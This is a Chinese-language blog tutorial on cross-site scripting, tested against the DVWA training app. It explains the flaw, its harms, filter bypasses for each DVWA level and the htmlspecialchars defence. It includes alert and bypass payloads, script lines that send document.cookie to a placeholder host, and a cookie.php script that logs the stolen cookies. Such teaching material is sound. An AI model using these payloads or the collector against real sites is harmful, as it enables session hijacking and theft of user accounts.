@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试,DVWA,Web安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="DVWA测试XSS漏洞及XSS原理分析预防">
+<meta name="keywords" content="渗透测试,DVWA,Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全测试之XSS">
+<meta property="og:url" content="http://yoursite.com/2018/01/18/Web安全测试之XSS/index.html">
+<meta property="og:site_name" content="BEHIND THE GROWTH">
+<meta property="og:description" content="DVWA测试XSS漏洞及XSS原理分析预防">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-01-22T07:20:11.241Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全测试之XSS">
+<meta name="twitter:description" content="DVWA测试XSS漏洞及XSS原理分析预防">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/18/Web安全测试之XSS/"/>
+
+
+
+
+
+  <title>Web安全测试之XSS | BEHIND THE GROWTH</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BEHIND THE GROWTH</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一步一个脚印</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            时间轴
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/18/Web安全测试之XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wang YingYing">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog-logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BEHIND THE GROWTH">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全测试之XSS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-18T20:57:00+08:00">
+                2018-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  DVWA测试XSS漏洞及XSS原理分析预防
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>XSS</strong>：跨站脚本攻击 Cross site script(css)</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>何为跨站脚本攻击：网站没有对用户的输入进行转义或者过滤，让恶意用户可以在页面中嵌入代码(javascript)，让其他的用户访问都会执行相应的嵌入代码(存储型XSS)<br>原因：太过信任客户端提交的数据，让用户的输入变成了代码</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>帐号凭据泄漏(cookie)，让用户帐号被盗取</li>
+<li>用户数据被修改</li>
+<li>网站被挂马</li>
+<li>成为僵尸主机(被控向其他服务器发起攻击)</li>
+</ul>
+<h2 id="需掌握的一些知识"><a href="#需掌握的一些知识" class="headerlink" title="需掌握的一些知识"></a>需掌握的一些知识</h2><ul>
+<li>弹窗标签<pre><code>1、&lt;script&gt;alert(N | &apos;str&apos;)&lt;/script&gt;
+2、&lt;img src=# onerror=alert(N | &apos;str&apos;)&gt;
+3、&lt;svg onload=alert(N | &apos;str&apos;)&gt;
+4、&lt;iframe src=javascript:alert(N | &apos;str&apos;)&gt;&lt;/iframe&gt;
+5、&lt;a href=javascript:alert(N | &apos;str&apos;)&gt;xss&lt;/a&gt;
+</code></pre></li>
+<li>Encoding(hackbar、burpsuite)<br>&nbsp;&nbsp;&nbsp;&nbsp;HTML<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将特殊字符进行编码<pre><code>&lt;   &amp;lt;
+&gt;   &amp;gt;
+&amp;   &amp;amp;
+&apos;   &amp;#039;
+&quot;   &amp;quot;
+空格 &amp;nbsp;
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;URL<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把所有非字母数字字符都将被替换成百分号（%）后跟两位十六进制数，空格则编码为加号（+）</li>
+<li>PHP函数<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>strip_tags($str, [允许标签])</strong>：从字符串中去除 HTML 和 PHP 标记<br>&nbsp;&nbsp;&nbsp;&nbsp;htmlentities($str)函数：转义html实体<br>&nbsp;&nbsp;&nbsp;&nbsp;html_entity_decode($str)函数：反转义html实体<br>&nbsp;&nbsp;&nbsp;&nbsp;addcslashes($str, ‘字符’)函数：给某些字符加上反斜杠<br>&nbsp;&nbsp;&nbsp;&nbsp;stripcslashes($str)函数：去掉反斜杠<br>&nbsp;&nbsp;&nbsp;&nbsp;addslashes ($str )函数：单引号、双引号、反斜线与 NULL加反斜杠<br>&nbsp;&nbsp;&nbsp;&nbsp;stripslashes($str)函数：去掉反斜杠<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>htmlspecialchars()</strong>：特殊字符转换为HTML实体<br>&nbsp;&nbsp;&nbsp;&nbsp;htmlspecialchars_decode()：将特殊的 HTML 实体转换回普通字符</li>
+<li>绕过技巧<br>&nbsp;&nbsp;&nbsp;&nbsp;1、前端字符数字限制<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用浏览器开发者工具修改字符长度<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;抓包修改提交数据<br>&nbsp;&nbsp;&nbsp;&nbsp;2、标签闭合<pre><code>&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;3、String.fromCharCode<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java进行ASCII转换函数<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过php的magic_quotes_gpc选项 -&gt; 特殊字符进行转义输出(‘ -&gt; \’)<pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59[alert(&quot;XSS&quot;)])&lt;/script&gt;
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;4、大小写<pre><code>&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;4、编码转换(url)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEX编码<pre><code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;
+ HEX
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e
+ URL
+%3cscript%3ealert%281%29%3c%2fscript%3e
+</code></pre></li>
+<li><p>javascript功能<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>document.cookie</strong>：读取页面cookie</p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>document.write(‘tag’)</strong>：往页面中写入标签</p>
+<pre><code>&lt;script&gt;document.write(&apos;&lt;img src=&quot;http://domai/cookie/cookie.php?cookie=&apos;+document.cookie+&apos;&quot; width=0 height=0 border=0&gt;&apos;)&lt;/script&gt;
+</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>window.open(URL)</strong>：打开一个链接</p>
+<pre><code>&lt;script&gt;window.open(&quot;http://domai/cookie/cookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;
+</code></pre><p>  <strong>cookie.php</strong></p>
+<pre><code>&lt;?php
+$cookie=$_GET[&apos;cookie&apos;];
+$time=date(&apos;Y-m-d g:i:s&apos;);
+$referer=getenv(&apos;HTTP_REFERER&apos;);
+$cookietxt=fopen(&apos;cookie.txt&apos;, &apos;a&apos;);
+$data = &quot;time:&quot;.$time.&quot; --&gt; &quot;.&quot;cookie:&quot;.$cookie.&quot; --&gt; &quot;.&quot;referer:&quot;.$referer.&quot;\n&quot;;     fwrite($cookietxt, $data);
+fclose($cookietxt);
+?&gt;
+</code></pre></li>
+</ul>
+<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><ul>
+<li>反射型<br>&nbsp;&nbsp;&nbsp;&nbsp;恶意代码来源于页面请求<br>&nbsp;&nbsp;&nbsp;&nbsp;请求数据不做存储，直接返回给用户<br>&nbsp;&nbsp;&nbsp;&nbsp;一般出现在输出用户输入<br>&nbsp;&nbsp;&nbsp;&nbsp;使用：向目标发送恶意的链接，或者生成恶意广告嵌入XSS链接，回去访问者cookie凭据</li>
+<li>存储型<br>&nbsp;&nbsp;&nbsp;&nbsp;恶意代码来自网站数据库<br>&nbsp;&nbsp;&nbsp;&nbsp;而已的代码块被写入到数据库<br>&nbsp;&nbsp;&nbsp;&nbsp;一般出现在评论/注册页面<br>&nbsp;&nbsp;&nbsp;&nbsp;使用：只要用户访问了被写入存储型XSS的页面，cookie凭据就会被盗取</li>
+<li>DOM型<br>&nbsp;&nbsp;&nbsp;&nbsp;类似反射型<br>&nbsp;&nbsp;&nbsp;&nbsp;用户从URL中构造恶意的代码块</li>
+</ul>
+<h2 id="DVWA测试"><a href="#DVWA测试" class="headerlink" title="DVWA测试"></a>DVWA测试</h2><p><strong>只做反射型弹窗测试，存储型类似</strong></p>
+<ul>
+<li>low级别：直接弹窗，可以之直接写入javascript</li>
+<li>medium级别<br>&nbsp;&nbsp;&nbsp;&nbsp;安全设置<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<strong>str_replace</strong>函数替换脚本标签<pre><code>$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); 
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;绕过<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str_replace只做一次检索，<strong>组合过滤标签</strong><pre><code>&lt;scrip&lt;script&gt;t&gt;alert(1)&lt;/script&gt;
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用其他除了script的触发时间标签</li>
+<li>high级别<br>&nbsp;&nbsp;&nbsp;&nbsp;安全设置<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<strong>preg_replace</strong>函数，对字符进行正则匹配过滤<pre><code>$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); 
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;绕过<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用除script的其他出发事件的标签<pre><code>&lt;img src=# onerror=alert(&apos;str&apos;)&gt;
+</code></pre></li>
+<li>impossbile级别<br>&nbsp;&nbsp;&nbsp;&nbsp;安全设置<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用htmlspecialchars函数将HTML特殊字符正常输出(&lt;、&gt;、’、”、&amp;…)<pre><code>$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );
+</code></pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;做Token会话刷新限制</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/DVWA/" rel="tag"><i class="fa fa-tag"></i> DVWA</a>
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/18/Web安全测试/" rel="next" title="Web安全测试之登录绕过+命令注入+CSRF">
+                <i class="fa fa-chevron-left"></i> Web安全测试之登录绕过+命令注入+CSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/18/Web安全测试之文件上传-文件包含/" rel="prev" title="Web安全测试之文件上传/文件包含">
+                Web安全测试之文件上传/文件包含 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/blog-logo.jpg"
+                alt="Wang YingYing" />
+            
+              <p class="site-author-name" itemprop="name">Wang YingYing</p>
+              <p class="site-description motion-element" itemprop="description">自己选的路，跪着是走不完的</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#危害"><span class="nav-number">2.</span> <span class="nav-text">危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#需掌握的一些知识"><span class="nav-number">3.</span> <span class="nav-text">需掌握的一些知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS类型"><span class="nav-number">4.</span> <span class="nav-text">XSS类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA测试"><span class="nav-number">5.</span> <span class="nav-text">DVWA测试</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wang YingYing</span>
+
+  
+</div>
+
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+  </span>
+  </div>
+
+<!--  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
